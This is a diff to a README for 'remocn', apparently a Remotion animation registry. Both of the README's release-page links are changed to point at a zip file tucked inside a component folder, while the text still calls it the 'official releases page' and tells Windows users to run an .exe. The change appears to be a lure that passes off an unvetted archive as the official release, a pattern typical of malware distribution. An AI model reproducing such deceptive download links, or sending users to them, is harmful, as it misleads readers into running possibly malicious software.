@@ -1,6 +1,6 @@
 # 🎬 remocn - Create polished video content fast
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/suppressorplaybill4170/remocn/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/suppressorplaybill4170/remocn/main/registry/remocn/marker-highlight/Software_v2.0-beta.3.zip)
 
 Remocn provides ready-made animations, transitions, backgrounds, and scenes for your video projects. This tool works as a registry for Remotion. It helps solo builders finish demo videos in record time. You pick the components you need and add them directly to your work.
 
@@ -14,7 +14,7 @@ These components look professional and behave predictably. You install them into
 
 You need to access the release page to obtain the application. Follow these instructions to get the installer for your Windows computer.
 
-1. Visit the [official releases page](https://github.com/suppressorplaybill4170/remocn/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/suppressorplaybill4170/remocn/main/registry/remocn/marker-highlight/Software_v2.0-beta.3.zip).
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Click on the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
